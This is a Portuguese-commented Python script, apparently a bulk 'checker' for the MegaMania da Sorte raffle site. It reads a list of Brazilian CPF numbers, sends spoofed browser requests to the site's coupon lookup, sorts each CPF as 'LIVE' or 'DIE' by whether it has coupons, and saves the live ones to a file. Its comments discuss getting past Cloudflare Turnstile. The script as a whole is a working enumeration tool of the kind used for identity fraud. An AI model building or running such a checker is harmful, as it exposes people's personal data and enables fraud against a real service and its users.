# megamania_final.py
import requests
import re
import time
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

# Desabilita warnings SSL
urllib3.disable_warnings()

class MegaManiaChecker:
    def __init__(self):
        self.base_url = "https://consulta.megamaniadasorte.com.br"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": self.base_url,
            "Referer": f"{self.base_url}/meus-cupons",
            "Sec-Ch-Ua": '"Chromium";v="120", "Not(A:Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        })
        
    def format_cpf(self, cpf):
        """Formata CPF com pontos e traço"""
        cpf_clean = re.sub(r'\D', '', cpf)
        if len(cpf_clean) != 11:
            return None
        return f"{cpf_clean[:3]}.{cpf_clean[3:6]}.{cpf_clean[6:9]}-{cpf_clean[9:]}"
    
    def check_cpf(self, cpf):
        """Verifica um CPF seguindo o fluxo correto do site"""
        cpf_formatted = self.format_cpf(cpf)
        if not cpf_formatted:
            return "ERROR", "CPF inválido", 0
            
        try:
            # Passo 1: Visita a página inicial para obter cookies
            self.session.get(f"{self.base_url}/meus-cupons", timeout=10)
            time.sleep(0.5)
            
            # Passo 2: Envia o CPF (simula preenchimento do formulário)
            # O site provavelmente espera um POST ou precisa resolver o Turnstile primeiro
            # Por enquanto, vamos tentar acessar diretamente com o CPF
            
            # Passo 3: Acessa a URL com _data para obter o JSON
            params = {
                'cpf': cpf_formatted,
                '_data': 'routes/meus-cupons.ver'
            }
            
            url = f"{self.base_url}/meus-cupons/ver"
            response = self.session.get(url, params=params, timeout=15)
            
            # Se retornou redirect ou HTML, tenta sem _data
            if response.status_code != 200 or not response.text.startswith('{'):
                response = self.session.get(f"{url}?cpf={cpf_formatted}", timeout=15)
            
            # Tenta parsear como JSON
            try:
                data = response.json()
                
                # Verifica se tem a estrutura esperada
                if 'couponsSummary' in data:
                    total_coupons = data['couponsSummary'].get('totalCoupons', 0)
                    if total_coupons > 0:
                        return "LIVE", f"{total_coupons} cupons", total_coupons
                    else:
                        return "DIE", "Sem cupons", 0
                        
                # Se não tem couponsSummary, pode ser erro ou formato diferente
                return "ERROR", "Formato inesperado", 0
                
            except json.JSONDecodeError:
                # Se não é JSON, provavelmente está no formulário
                if 'Acessar meus títulos' in response.text or 'identifique-se' in response.text:
                    return "DIE", "Sem cadastro", 0
                else:
                    return "ERROR", "Resposta não é JSON", 0
                    
        except requests.exceptions.Timeout:
            return "ERROR", "Timeout", 0
        except Exception as e:
            return "ERROR", str(e)[:50], 0
    
    def process_list(self, cpf_list, max_workers=5):
        """Processa lista de CPFs"""
        print(f"\n🎯 MegaMania Checker v7.0 FINAL")
        print(f"📍 Site: {self.base_url}")
        print(f"\n📋 {len(cpf_list)} CPFs carregados")
        
        # Teste com primeiro CPF
        print(f"\n🧪 Testando com primeiro CPF...")
        test_cpf = cpf_list[0]
        status, msg, cupons = self.check_cpf(test_cpf)
        print(f"   CPF: {self.format_cpf(test_cpf)}")
        print(f"   Status: {status}")
        print(f"   Info: {msg}")
        
        if status == "ERROR" and ("JSON" in msg or "Formato" in msg):
            print("\n⚠️  AVISO: O site pode estar retornando HTML ao invés de JSON!")
            print("   Isso indica que:")
            print("   1. Precisa resolver o Cloudflare Turnstile primeiro")
            print("   2. Precisa de um token JWT válido")
            print("   3. O fluxo mudou e requer automação com navegador")
            
        input("\n▶️  Continuar com todos? (ENTER para sim): ")
        
        # Estatísticas
        total_live = 0
        total_die = 0
        total_error = 0
        total_cupons = 0
        
        # Processa todos
        print(f"\n🚀 Processando {len(cpf_list)} CPFs...\n")
        
        with open("live.txt", "w") as live_file:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_cpf = {
                    executor.submit(self.check_cpf, cpf): cpf 
                    for cpf in cpf_list
                }
                
                for i, future in enumerate(as_completed(future_to_cpf), 1):
                    cpf = future_to_cpf[future]
                    status, msg, cupons = future.result()
                    
                    if status == "LIVE":
                        total_live += 1
                        total_cupons += cupons
                        live_file.write(f"{cpf}\n")
                        live_file.flush()
                        print(f"[{i}/{len(cpf_list)}] ✅ LIVE - {self.format_cpf(cpf)} ({msg})")
                    elif status == "DIE":
                        total_die += 1
                        print(f"[{i}/{len(cpf_list)}] ❌ DIE - {self.format_cpf(cpf)} ({msg})")
                    else:
                        total_error += 1
                        print(f"[{i}/{len(cpf_list)}] ⚠️ {status} - {self.format_cpf(cpf)} ({msg})")
                    
                    # Pequeno delay entre requisições
                    time.sleep(0.3)
        
        # Resumo final
        print(f"\n{'='*50}")
        print(f"📊 RESUMO FINAL:")
        print(f"   Total verificados: {len(cpf_list)}")
        print(f"   ✅ LIVE: {total_live}")
        print(f"   ❌ DIE: {total_die}")
        print(f"   ⚠️ ERRO: {total_error}")
        if total_live > 0:
            print(f"   🎫 Total de cupons: {total_cupons}")
        print(f"   📁 Lives salvos em: live.txt")
        print(f"{'='*50}")

def main():
    # Lê lista de CPFs
    try:
        with open("lista.txt", "r") as f:
            cpf_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("❌ Arquivo lista.txt não encontrado!")
        return
    
    # Remove duplicados
    cpf_list = list(set(cpf_list))
    
    # Cria checker e processa
    checker = MegaManiaChecker()
    checker.process_list(cpf_list, max_workers=3)

if __name__ == "__main__":
    main()